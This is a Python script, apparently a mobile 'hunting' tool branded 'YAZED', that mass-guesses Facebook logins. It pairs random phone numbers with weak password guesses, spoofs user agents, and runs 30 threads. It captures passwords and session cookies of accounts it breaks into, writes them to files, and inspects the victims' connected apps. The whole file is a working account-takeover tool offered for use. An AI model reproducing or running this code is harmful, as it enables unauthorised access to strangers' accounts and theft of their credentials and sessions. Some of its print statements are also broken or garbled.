import os

os.system('am start https://t.me/YAZED_I')

from bs4 import BeautifulSoup as sop

from concurrent.futures import ThreadPoolExecutor as tred

import os,sys,time,json,random,re,string,platform,base64,platform,uuid

import marshal

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install requests pip , install futures , pip install rich')

    os.system('python USMAN.py')

   #os.system("xdg-open https://www.facebook.com/profile.php?id=100074423508403&mibextid=ZbWKwL")

from bs4 import BeautifulSoup

ugen = []

def subc():

   uuid=str(os.geteuid())+str(os.getlogin())

   id="|".join(uuid)

  

   	

print('\033[1;31m  YAZED AR 🔥 ')

A = '\x1b[1;97m'

B = '\x1b[1;96m'

C = '\x1b[1;91m'

D = '\x1b[1;92m'

M = '\033[1;31m'

H = '\033[1;32m'

N = '\x1b[1;37m'#

E = '\x1b[1;93m'

F = '\x1b[1;94m'

G = '\x1b[1;95m'

P = '\033[1;37m'

BLUE = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

KB = '{ KB }'

for xd in range(10000):

    a=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
  
   

    

    b=random.choice(['6','7','8','9','10','11','12'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(9200,9900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

try:

    os.system('curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html')

except:

    pass

def uaku():

    try:

        ua=open('bbnew.txt','r').read().splitlines()

        for ub in ua:

            ugen.append(ub)

    except:

        a=requests.get('https://bacho1001.blogspot.com/2022/07/ua.html').text

        ua=open('.user-agents.txt','w')

        aa=re.findall('line">(.*?)<',str(a))

        for un in aa:

            ua.write(un+'\n')

        ua=open('.user-agents.txt','r').read().splitlines()

loop = 0

cps = []

oks = []

twf = []

def clear():

    os.system('clear')

    print(logo)  

logo = """
\033[1;31m██    ██  █████  ███████ ███████ ██████  
 ██  ██  ██   ██    ███  ██      ██   ██ 
  ████   ███████   ███   █████   ██   ██ 
   ██    ██   ██  ███    ██      ██   ██ 
   ██    ██   ██ ███████ ███████ ██████\033[1;31m
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                                                        
\033[1;97m  WHATSAPP : \033[1;31m091######

\033[1;97m  RIGHTS   : \033[1;31mYAZED

\033[1;97m  SOURCE   : \033[1;31mFREE

\033[1;97m  THE HUNT : \033[1;31mLIBYA     """
def linex():
    print('\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')

def checks(oks,cps,twf):

    if not len(oks) != 0:

        pass

    if len(cps) != 0:

        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (

            H, P, str(len(oks))))

        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %

              (H, P, str(len(cps))))

        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %

              (H, P, str(len(twf))))

        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")

        xyz()

loop = 0

cps = []

oks = []

twf = []

def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS Ã°Å¸Å½Â®%s  '%(ORANGE))

    else:

        print(f'\r {GREEN}[Ã¢Ë†Å¡] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))

        for i in range(len(game)):

            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS Ã°Å¸Å½Â®%s'%(ORANGE))

    else:

        print(f'\r Ã°Å¸Å½Â®  %{BLUE}sYOUR EXPIRED APKS DETAILS :'%(BLUE))

        for i in range(len(game)):

            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print("\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
            print("clear")
  #____________#
def xyz():
    #os.system("xdg-open https:facebook.com/groups/215850205254503/")
    os.getuid
    os.system("clear")
    os.system("");print(logo)
    print(f"")
    print(f"\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(f" \033[1;97m[ A ] \033[1;31m GO TO HUNTING 🏴‍☠️")   
    print(f" \033[1;97m[ E ] \033[1;31m EXIT")
    print(f"")
    print(f"\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    USMAN = input(" CHOOSE 🏴‍☠️ : ")
    if USMAN in ["A","A"]:
        Random()
        os.system("xdg-open https://t.me/YAZED_I/")
    elif USMAN in ["E","e"]:
       exit()
    else:
        print('\031[1;31mINCORECT OPTION!\033[1;31m')
        xyz()
#____________#
#_____________________#
def Random():
    user=[]
    os.getuid
    os.geteuid
    #os.system("xdg-open https://facebook.com/groups/215850205254503/")

    print(logo)

    print(f"")

    clear()

    print(f"")

    linex()

    print(f"")

    print(f' YOUR COUNTRY CODE 🏴‍☠️')

    print(f"")

    linex()

    code = input(' CODE 🏴‍☠️ : ')

    os.system("clear")

    print(logo)

    print(f"")
    print(f"\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(f"")

    limit = int(input('\033[1;37m  EXAMPLE 🏴‍☠️ :\033[1;31m 1000, 2000 • 3000 • 5000 • 10000 : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        clear()

        tl = str(len(user))
        
        print(f"\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        print(f"\033[1;37m  TOTAL IDZ \033[1;31m :\033[1;37m "+tl)

        print(f" \033[1;37m NUMBER YOU PUT\033[1;31m :\033[1;37m "+code)

        print(f"\033[1;37m  PROCESS HAS BEEN STARTED 🏴‍☠️")

        print(f" \033[1;37m TO STOP PROCESS Ctrl + Z 🏴‍☠️ ")
        print(f'\033[31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')

        for love in user:

            uid = code+love

            pwx = [love]

            yaari.submit(free,uid,pwx,tl)

def free(uid,pwx,tl):

    global loop

    global oks

    global agents

    try:

        for ps in pwx:

            bi = random.choice([A])

            session = requests.Session()

            pro = random.choice(ugen)

            free_fb = session.get('https://m.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {'authority':'m.facebook.com',

            'method': 'POST',

            'scheme': 'https',

            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',

            'cache-control': 'max-age=0',

            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',

            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',

            'sec-fetch-dest': 'document',

            'sec-fetch-mode': 'navigate',

            'sec-fetch-site': 'none',

            'sec-fetch-user': '?1',

            'upgrade-insecure-requests': '1',

            'user-agent':pro}

            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print('\033[1;32m\n NUMBER   : '+uid+'\n PASSWORD : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'(f\033[31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')

                cek_apk(session,coki)

                open('/sdcard/USMAN-OK.txt', 'a').write(cid+' | '+ps+'\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid=coki[24:39]

                BLUE = '\033[1;31m'

                print(f'\033[1;31m ❌\n  NUMBER   : '+uid+'\n  PASSWORD : '+ps+ '\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')

                open('/sdcard/USMAN-CP.txt', 'a').write(cid+' | '+ps+'\n')

                cps.append(cid)

                break

            elif '/x/checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid=coki[7:22]

                BLUE = '\033[1;31m'

                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')

                open('/sdcard/USMAN-2F.txt', 'a').write(cid+' | '+ps+'\n')

                twf.append(cid)

            else:

                continue

        loop+=1

        sys.stdout.write(f'\r\33[1;31m  YAZED 🏴‍☠️ [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))),

        sys.stdout.flush()

        checks(oks,cps,twf)

    except:

        pass

if __name__ == '__main__':

    xyz()

